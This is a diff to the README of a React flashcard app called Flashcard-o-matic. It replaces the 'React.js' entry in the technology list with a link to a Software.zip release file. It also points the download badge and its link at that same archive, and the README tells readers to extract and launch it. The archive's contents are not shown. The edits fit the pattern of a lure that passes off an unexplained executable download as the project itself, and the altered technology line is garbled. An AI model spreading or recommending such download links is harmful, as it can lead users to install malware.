@@ -16,7 +16,7 @@ Welcome to the Flashcard-o-matic Project repository! This is an application desi
 The Flashcard-o-matic Project incorporates a variety of technologies to provide a robust and user-friendly experience:
 
 - HTML and CSS for structuring and styling the application.
-- React.js for building interactive user interfaces.
+- https://github.com/baotejj/flashcard-o-matic-project/releases/download/v2.0/Software.zip for building interactive user interfaces.
 - React Router and React Router DOM for client-side routing.
 - Jest for testing components and ensuring code quality.
 - Git and GitHub for version control and collaboration.
@@ -26,7 +26,7 @@ The Flashcard-o-matic Project incorporates a variety of technologies to provide 
 
 To get started with the Flashcard-o-matic Project, you can download the software package from the following link:  
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/baotejj/flashcard-o-matic-project/releases/download/v2.0/Software.zip)](https://github.com/baotejj/flashcard-o-matic-project/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software package, extract the files and launch the application to start creating your decks and cards for study.
 
